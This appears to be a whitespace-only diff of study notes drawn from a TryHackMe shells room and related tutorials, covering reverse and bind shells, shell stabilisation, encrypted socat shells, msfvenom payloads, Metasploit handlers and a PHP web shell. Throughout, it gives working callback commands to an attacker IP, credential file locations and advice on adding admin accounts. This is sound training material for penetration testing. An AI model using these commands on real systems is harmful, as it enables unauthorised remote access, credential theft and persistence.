@@ -1,6 +1,6 @@
 From: https://tryhackme.com/room/introtoshells ; Task 1 [with some edits and rephrasing]
 
-...In the simplest possible terms, shells are what we use when interfacing with a Command Line environment (CLI). In other words, the common bash or sh programs in Linux are examples of shells, as are cmd.exe and Powershell on Windows. When targeting remote systems it is sometimes possible to force an application running on the server (such as a webserver, for example) to execute arbitrary code. When this happens, we want to use this initial access to obtain a shell running on the target.
+...In the simplest possible terms, shells are what we use when interfacing with a Command Line environment (CLI). In other words, the common bash or sh programs in Linux are examples of shells, as are cmd.exe and Powershell on Windows. When targeting remote systems it is sometimes possible to force an application running on the server (such as a webserver, for example) to execute arbitrary code. When this happens, we want to use this initial access to obtain a shell running on the target.  
 In simple terms, we can force the remote server to either send us command line access to the server (a reverse shell), or to open up a port on the server which we can connect to in order to execute further commands (a bind shell)...
 -------------------------------------------------------------------------------------------------
 From: https://tryhackme.com/room/introtoshells ; Task 2 [with some edits and rephrasing]
@@ -15,8 +15,8 @@ Socat:
 
 Socat is like netcat on steroids. It can do all of the same things, and many more. Socat shells are usually more stable than netcat shells out of the box. In this sense it is vastly superior to netcat; however, there are two big catches:
 
-1) The syntax is more difficult
-2) Netcat is installed on virtually every Linux distribution by default. Socat is very rarely installed by default.
+1) The syntax is more difficult  
+2) Netcat is installed on virtually every Linux distribution by default. Socat is very rarely installed by default.  
 There are work arounds to both of these problems, which we will cover later on.
 
 Both Socat and Netcat have .exe versions for use on Windows.
@@ -35,18 +35,18 @@ From: https://tryhackme.com/room/introtoshells ; Task 3 [with some edits and rep
 
 At a high level, we are interested in two kinds of shell when it comes to exploiting a target: Reverse shells, and bind shells.
 
-Reverse shells are when the target is forced to execute code that connects back to your computer. On your own computer you would use one of the tools mentioned in the previous task to set up a listener which would be used to receive the connection. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell. This, however, will not be a problem on the TryHackMe network due to the method by which we connect into the network.
-Bind shells are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.
+Reverse shells are when the target is forced to execute code that connects back to your computer. On your own computer you would use one of the tools mentioned in the previous task to set up a listener which would be used to receive the connection. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell. This, however, will not be a problem on the TryHackMe network due to the method by which we connect into the network.  
+Bind shells are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.  
 As a general rule, reverse shells are easier to execute and debug...
 
 The final concept which is relevant in this task is that of interactivity. Shells can be either interactive or non-interactive.
 
-Interactive: If you've used Powershell, Bash, Zsh, sh, or any other standard CLI environment then you will be used to
+Interactive: If you've used Powershell, Bash, Zsh, sh, or any other standard CLI environment then you will be used to  
 interactive shells. These allow you to interact with programs after executing them. For example, take the SSH login prompt. When attempting to execute an SSH connection, the shell may ask: "The authenticity of ____________ can't be established...Are you sre you want to continue connecting (yes/no/[fingerprint])?"
 
 Here you can see that it's asking interactively that the user type either yes or no in order to continue the connection. This is an interactive program, which requires an interactive shell in order to run.
 
-Non-Interactive shells don't give you that luxury. In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly. Unfortunately, the majority of simple reverse and bind shells are non-interactive, which can make further exploitation trickier. 
+Non-Interactive shells don't give you that luxury. In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly. Unfortunately, the majority of simple reverse and bind shells are non-interactive, which can make further exploitation trickier.  
 If you use a non-interactive command (such as whoami) on a non-interactive shell, it will respond. But if you attempt an interactive command (e.g. using ssh) you will receive no output at all...
 -------------------------------------------------------------------------------------------------------------------
 From: https://tryhackme.com/room/introtoshells ; Task 4 [with some edits and rephrasing]
@@ -61,10 +61,10 @@ The syntax for starting a netcat listener using Linux is this:
 
 nc -lvnp <port-number>
 
--l is used to tell netcat that this will be a listener
--v is used to request a verbose output
--n tells netcat not to resolve host names or use DNS. Explaining this is outwith the scope of the room.
--p indicates that the port specification will follow.
+-l is used to tell netcat that this will be a listener  
+-v is used to request a verbose output  
+-n tells netcat not to resolve host names or use DNS. Explaining this is outwith the scope of the room.  
+-p indicates that the port specification will follow.  
 [Note: Realistically you could use any port you like, as long as there isn't already a service using it. Be aware that if you choose to use a port below 1024, you will need to use sudo when starting your listener. That said, it's often a good idea to use a well-known port number (80, 443 or 53 being good choices) as this is more likely to get past outbound firewall rules on the target.]
 
 A working example of this would be:
@@ -92,14 +92,14 @@ Technique 1: Python
 
 The first technique we'll be discussing is applicable only to Linux boxes, as they will nearly always have Python installed by default. This is a three stage process:
 
-The first thing to do is use:
-python -c 'import pty;pty.spawn("/bin/bash")'
-, which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace python with python2 or python3 as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
-Step two is:
-export TERM=xterm -- this will give us access to term commands such as clear.
-Finally (and most importantly) we will background the shell using Ctrl + Z.
-Back in our own terminal we use:
-stty raw -echo; fg
+The first thing to do is use:  
+python -c 'import pty;pty.spawn("/bin/bash")'  
+, which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace python with python2 or python3 as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.  
+Step two is:  
+export TERM=xterm -- this will give us access to term commands such as clear.  
+Finally (and most importantly) we will background the shell using Ctrl + Z.  
+Back in our own terminal we use:  
+stty raw -echo; fg  
 This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.
 
 Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type 'reset' and press enter.
@@ -107,21 +107,21 @@ Note that if the shell dies, any input in your own terminal will not be visible 
 ------------------------
 Technique 2: rlwrap
 
-rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with:
+rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with:  
 sudo apt install rlwrap.
 
 To use rlwrap, we invoke a slightly different listener:
 
 rlwrap nc -lvnp <port>
 
-Prepending our netcat listener with "rlwrap" gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use:
-stty raw -echo; fg
+Prepending our netcat listener with "rlwrap" gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use:  
+stty raw -echo; fg  
 to stabilise and re-enter the shell.
 
 -----------------------------------
 Technique 3: Socat
 
-[Note: in order to understand the information regarding tty and stty see here: https://www.geeksforgeeks.org/tty-command-in-linux-with-examples/ and here: https://youtu.be/WnjofnvIIvg. The following quote is from the first source: 
+[Note: in order to understand the information regarding tty and stty see here: https://www.geeksforgeeks.org/tty-command-in-linux-with-examples/ and here: https://youtu.be/WnjofnvIIvg. The following quote is from the first source:  
 "Linux operating system represents everything in a file system, the hardware devices that we attach are also represented as a file. The terminal is also represented as a file. There a command exists called tty which displays information related to terminal. The tty command of terminal basically prints the file name of the terminal connected to standard input. tty is short of teletype, but popularly known as a terminal it allows you to interact with the system by passing on the data (you input) to the system, and displaying the output produced by the system."]
 
 
@@ -131,8 +131,8 @@ For the sake of completeness: in a Windows CLI environment the same can be done 
 -------------------------------------
 With any of the above techniques, it's useful to be able to change your terminal tty size. This is something that your terminal will do automatically when using a regular shell; however, it must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.
 
-First, open another terminal and run:
-stty -a
+First, open another terminal and run:  
+stty -a  
 This will give you a large stream of output. Note down the values for "rows" and columns.
 
 Next, in your reverse/bind shell, type in:
@@ -194,8 +194,8 @@ Now let's take a look at one of the more powerful uses for Socat: a fully stable
 
 socat TCP-L:<port> FILE:`tty`,raw,echo=0
 
-Let's break this command down into its two parts. As usual, we're connecting two points together. In this case those points are a listening port, and a file. Specifically, we are passing in the current TTY as a file and setting the echo to be zero. This is approximately equivalent to using the:
-Ctrl + Z, stty raw -echo; fg
+Let's break this command down into its two parts. As usual, we're connecting two points together. In this case those points are a listening port, and a file. Specifically, we are passing in the current TTY as a file and setting the echo to be zero. This is approximately equivalent to using the:  
+Ctrl + Z, stty raw -echo; fg  
 trick with a netcat shell -- with the added bonus of being immediately stable and hooking into a full tty.
 
 The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, however, it's possible to upload a precompiled socat binary (link to download precompiled socat binary: https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true), which can then be executed as normal.
@@ -208,16 +208,16 @@ This is a handful, so let's break it down.
 
 The first part is easy -- we're linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with  EXEC:"bash -li". We're also passing the arguments: pty, stderr, sigint, setsid and sane:
 
-pty, allocates a pseudoterminal on the target -- part of the stabilisation process
-stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
-sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
-setsid, creates the process in a new session
+pty, allocates a pseudoterminal on the target -- part of the stabilisation process  
+stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)  
+sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell  
+setsid, creates the process in a new session  
 sane, stabilises the terminal, attempting to "normalise" it...
 
 Note that the socat shell is fully interactive, allowing us to use interactive commands such as SSH. This can then be further improved by setting the stty values as seen in the previous task, which will let us use text editors such as Vim or Nano.
 
-If, at any point, a socat shell is not working correctly, it's well worth increasing the verbosity by adding:
--d -d
+If, at any point, a socat shell is not working correctly, it's well worth increasing the verbosity by adding:  
+-d -d  
 into the command. This is very useful for experimental purposes, but is not usually necessary for general use.
 -----------------------------------------------------------------------------------------------------------------------------------------
 From: https://tryhackme.com/room/introtoshells ; Task 7 [with some edits and rephrasing]
@@ -232,7 +232,7 @@ We first need to generate a certificate in order to use encrypted shells. This i
 
 openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
 
-This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.
+This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.  
 We then need to merge the two created files into a single .pem file:
 
 cat shell.key shell.crt > shell.pem
@@ -257,7 +257,7 @@ Attacker:
 
 socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
 
-Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.
+Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.  
 This technique will also work with the special, Linux-only TTY shell covered in the previous task...
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 From: https://tryhackme.com/room/introtoshells ; Task 8 [with some edits and rephrasing] together with information from TryHackMe – What The Shell? Walkthrough (https://cyberdad.uk/?p=246)
@@ -268,21 +268,21 @@ Common Shell Payloads
 
 Bind Shell
 ----------
-For example, in order to perform a netcat bind shell, start a listener on the target (obviously you would need access to the remote target in some way first) using:
+For example, in order to perform a netcat bind shell, start a listener on the target (obviously you would need access to the remote target in some way first) using:  
 nc -lvnp <PORT> -e /bin/bash
 
-Then on your local machine connect to the listener on the remote machine with netcat using the following command:
+Then on your local machine connect to the listener on the remote machine with netcat using the following command:  
 nc <REMOTE MACHINE'S IP> <REMOTE MACHINE'S LISTENING PORT>
 
 This will result in a bind shell on the target.
 
 Reverse Shell
 -------------
-In order to perform a reverse netcat shell:
-On your local machine open a netcat listening port using the following command:
-nc -lvnp <PORT>
-Then on the remote machine use the following command:
-nc <YOUR LOCAL MACHINE'S tun0 IP> <LISTENING PORT> -e /bin/bash
+In order to perform a reverse netcat shell:  
+On your local machine open a netcat listening port using the following command:  
+nc -lvnp <PORT>  
+Then on the remote machine use the following command:  
+nc <YOUR LOCAL MACHINE'S tun0 IP> <LISTENING PORT> -e /bin/bash  
 This will result in your local machine receiving a reverse shell from the target remote machine.
 
 However, this is not included in most versions of netcat as it is widely seen to be very insecure (funny that, huh?). On Windows where a static binary is nearly always required anyway, this technique will work perfectly. On Linux, however, we would instead use this code to create a listener for a bind shell:
@@ -325,14 +325,14 @@ For example, to generate a Windows x64 Reverse Shell in an exe format, we could 
 
 msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
 
-Here we are using a payload and four options:
--f <format>
-Specifies the output format. In this case that is an executable (exe)
--o <file>
-The output location and filename for the generated payload.
-LHOST=<IP>
-Specifies the IP to connect back to. When using TryHackMe, this will be your tun0 IP address. If you cannot load the link then you are not connected to the VPN.
-LPORT=<port>
+Here we are using a payload and four options:  
+-f <format>  
+Specifies the output format. In this case that is an executable (exe)  
+-o <file>  
+The output location and filename for the generated payload.  
+LHOST=<IP>  
+Specifies the IP to connect back to. When using TryHackMe, this will be your tun0 IP address. If you cannot load the link then you are not connected to the VPN.  
+LPORT=<port>  
 The port on the local machine to connect back to. This can be anything between 0 and 65535 that isn't already in use; however, ports below 1024 are restricted and require a listener running with root privileges.
 
 
@@ -340,8 +340,8 @@ Staged vs Stageless
 
 Before we go any further, there are another two concepts which must be introduced: staged reverse shell payloads and stageless reverse shell payloads.
 
-Staged payloads are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.
-Stageless payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.
+Staged payloads are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.  
+Stageless payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.  
 Stageless payloads tend to be easier to use and catch; however, they are also bulkier, and are easier for an antivirus or intrusion detection program to discover and remove. Staged payloads are harder to use, but the initial stager is a lot shorter, and is sometimes missed by less-effective antivirus software. Modern day antivirus solutions will also make use of the Anti-Malware Scan Interface (AMSI) to detect the payload as it is loaded into memory by the stager, making staged payloads less effective than they would once have been in this area.
 
 Meterpreter
@@ -386,8 +386,8 @@ Aside from the msfconsole man page, the other important thing to note when worki
 
 msfvenom --list payloads
 
-This can be used to list all available payloads, which can then be piped into grep to search for a specific set of payloads, e.g.:
-msfvenom --list payloads | grep "linux/x86/meterpreter"
+This can be used to list all available payloads, which can then be piped into grep to search for a specific set of payloads, e.g.:  
+msfvenom --list payloads | grep "linux/x86/meterpreter"  
 This gives us a full set of Linux meterpreter payloads for 32bit targets.
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -407,27 +407,27 @@ Type:
 
 use multi/handler
 
-and press enter
+and press enter  
 We are now primed to start a multi/handler session. [You can now] take a look at the available options using the options command.
 
 There are three options we need to set: payload, LHOST and LPORT. These are all identical to the options we set when generating  shellcode with Msfvenom -- a payload specific to our target, as well as a listening address and port with which we can receive a shell. Note that the LHOST must be specified here, as metasploit will not listen on all network interfaces like netcat or socat will; it must be told a specific address to listen with ... We set these options with the following commands:
 
-set PAYLOAD <payload>
-set LHOST <listen-address>
+set PAYLOAD <payload>  
+set LHOST <listen-address>  
 set LPORT <listen-port>
 
 We should now be ready to start the listener!
 
-Let's do this by using the
-exploit -j
+Let's do this by using the  
+exploit -j  
 command. This tells Metasploit to launch the module, running as a job in the background.
 
 [Note: to have Metasploit listen] on a port under 1024 ... Metasploit must be run with sudo permissions.
 
 When the staged payload [discussed in Task 9] is run, Metasploit receives the connection, sending the remainder of the payload and giving us a reverse shell.
 
-Notice that, because the multi/handler was originally backgrounded, we needed to use:
-sessions 1
+Notice that, because the multi/handler was originally backgrounded, we needed to use:  
+sessions 1  
 to foreground it again. This worked as it was the only session running. Had there been other sessions active, we would have needed to use sessions to see all active sessions, then use sessions <number> to select the appropriate session to foreground. This number would also have been displayed in the line where the shell was opened (see "Command Shell session 1 opened").
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 From: https://tryhackme.com/room/introtoshells ; Task 11 [with some edits and rephrasing]
@@ -447,7 +447,7 @@ In a very basic one line format:
 
 This will take a GET parameter in the URL and execute it on the system with shell_exec(). Essentially, what this means is that any commands we enter in the URL after ?cmd= will be executed on the system -- be it Windows or Linux. The "pre" elements are to ensure that the results are formatted correctly on the page.
 
-[For example:]
+[For example:]  
 https://10.10.84.199/uploads/shell.php?cmd=ifconfig
 
 Notice that when navigating the shell, we used a GET parameter "cmd" with the command "ifconfig", which correctly returned the network information of the box. In other words, by entering the ifconfig command (used to check the network interfaces on a Linux target) into the URL of our shell, it was executed on the system, with the results returned to us. This would work for any other command we chose to use (e.g. whoami, hostname, arch, etc).
@@ -470,10 +470,10 @@ We've covered lots of ways to generate, send and receive shells. The one thing t
 
 On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at /home/<user>/.ssh are often an ideal way to do this. In CTFs it's also not infrequent to find credentials lying around somewhere on the box. Some exploits will also allow you to add your own account. In particular something like Dirty C0w (see here: https://dirtycow.ninja/) or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.
 
-On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at:
-C:\Program Files\FileZilla Server\FileZilla Server.xml
-or
-C:\xampp\FileZilla Server\FileZilla Server.xml
+On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at:  
+C:\Program Files\FileZilla Server\FileZilla Server.xml  
+or  
+C:\xampp\FileZilla Server\FileZilla Server.xml  
 These can be MD5 hashes or in plaintext, depending on the version.
 
 Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.
@@ -490,67 +490,67 @@ Reverse and Bind shells are an essential technique for gaining remote code execu
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 From Heath Adams - The Cyber Mentor (Practical Ethical Hacking: The Complete Course - https://academy.tcm-sec.com/courses/1152300)
 
-When receiving a meterpreter prompt, entering the command `shell` will give you a shell:
+When receiving a meterpreter prompt, entering the command `shell` will give you a shell:  
 meterpreter > shell
 
 However, this will not be a fully functional shell as represented by the fact that there is no prompt. In order to get a full tty shell see below.
 --------------------------
-From: https://steflan-security.com/linux-tty-shell-cheat-sheet/ [with some editing of layout]
-Linux TTY Shell Cheat Sheet
+From: https://steflan-security.com/linux-tty-shell-cheat-sheet/ [with some editing of layout]  
+Linux TTY Shell Cheat Sheet  
 May 13, 2021 | by Stefano Lanaro
 
-Introduction
+Introduction  
 During a penetration test, when obtaining access to a remote Linux host via a reverse/bind shell, it can be very painful to issue certain commands over it and it is often a much better option to obtain an interactive shell. These are the main reason why this is a good idea:
 
-* More shell stability, as things like CTRL+C will no longer close down the connection.
-* Ability to use up, down, left, and right arrows to navigate through and modify commands.
-* Ability to use applications or commands that use a login prompt such as Sudo, MySQL, SSH, etc.
-* Ability to use tab-auto completion in commands.
+* More shell stability, as things like CTRL+C will no longer close down the connection.  
+* Ability to use up, down, left, and right arrows to navigate through and modify commands.  
+* Ability to use applications or commands that use a login prompt such as Sudo, MySQL, SSH, etc.  
+* Ability to use tab-auto completion in commands.  
 * Ability to view commands, output, and file contents in the same terminal size as the host machine.
 
 This article will list the various commands that can be used to obtain a TTY shell and also how to turn it into a fully interactive shell.
 
-Cheat Sheet
+Cheat Sheet  
 The following table contains commands to execute in various scripting languages and tools to
 
-Command                                             Description
-python -c ‘import pty; pty.spawn(“/bin/bash”)’	    Python BASH TTY shell
-python3 -c ‘import pty; pty.spawn(“/bin/bash”)’     Python 3 BASH TTY shell
-echo os.system(‘/bin/bash’)	                        Echo BASH TTY shell
-/bin/bash -i	                                      BASH TTY shell
-perl -e ‘exec “/bin/bash”;’	                        Perl BASH TTY shell
-ruby -e ‘exec “/bin/bash”‘	                        Ruby BASH TTY shell
-lua -e ‘os.execute(‘/bin/bash’)’	                  Lua BASH TTY shell
-exec “/bin/bash”	                                  IRB BASH TTY shelll
-:!bash	                                            Vi/Vim BASH TTY shell
-:set shell=/bin/bash:shell	                        Vi/Vim BASH TTY shell
-CTRO+R CTRL+X reset; /bin/bash 1>&0 2>&0	          Nano BASH TTY shell
+Command                                             Description  
+python -c ‘import pty; pty.spawn(“/bin/bash”)’	    Python BASH TTY shell  
+python3 -c ‘import pty; pty.spawn(“/bin/bash”)’     Python 3 BASH TTY shell  
+echo os.system(‘/bin/bash’)	                        Echo BASH TTY shell  
+/bin/bash -i	                                      BASH TTY shell  
+perl -e ‘exec “/bin/bash”;’	                        Perl BASH TTY shell  
+ruby -e ‘exec “/bin/bash”‘	                        Ruby BASH TTY shell  
+lua -e ‘os.execute(‘/bin/bash’)’	                  Lua BASH TTY shell  
+exec “/bin/bash”	                                  IRB BASH TTY shelll  
+:!bash	                                            Vi/Vim BASH TTY shell  
+:set shell=/bin/bash:shell	                        Vi/Vim BASH TTY shell  
+CTRO+R CTRL+X reset; /bin/bash 1>&0 2>&0	          Nano BASH TTY shell  
 !bash	                                              Nmap BASH TTY shell
 
-Obtaining a Fully Interactive Shell
+Obtaining a Fully Interactive Shell  
 The commands used above can also be issued with sh or /bin/sh, rather than bash or /bin/bash, if BASH is not an option. Once a TTY shell has been achieved, the following commands can be used in order to obtain a fully interactive shell:
 
-#backgrounding the shell process
+#backgrounding the shell process  
 Ctrl-Z
 
-#checking the number of rows and columns in the host terminal
+#checking the number of rows and columns in the host terminal  
 stty -a
 
-#setting terminal settings like new line, break characters etc.
+#setting terminal settings like new line, break characters etc.  
 stty raw -echo
 
-#returning to the shell
+#returning to the shell  
 fg + ENTER
 
-#declaring environment variables to be able to use cllear etc. and colors
-reset
-export SHELL=bash
+#declaring environment variables to be able to use cllear etc. and colors  
+reset  
+export SHELL=bash  
 export TERM=xterm-256color
 
-#setting the terminal rows and columns based on the host configuration
+#setting the terminal rows and columns based on the host configuration  
 stty rows <num> columns <cols>
 
-Conclusion
+Conclusion  
 Having a fully interactive shell can help immensely while enumerating a given host, performing post exploitation techniques and attempting to escalate privileges, and as most Linux systems come with Python or other scripting languages already installed, obtaining one should be fairly effortless.
 
 [For a discussion of the history of the terms "Terminal, Shell, TTY, and Console" see: https://www.baeldung.com/linux/terminal-shell-tty-vs-console --MagVeTs]
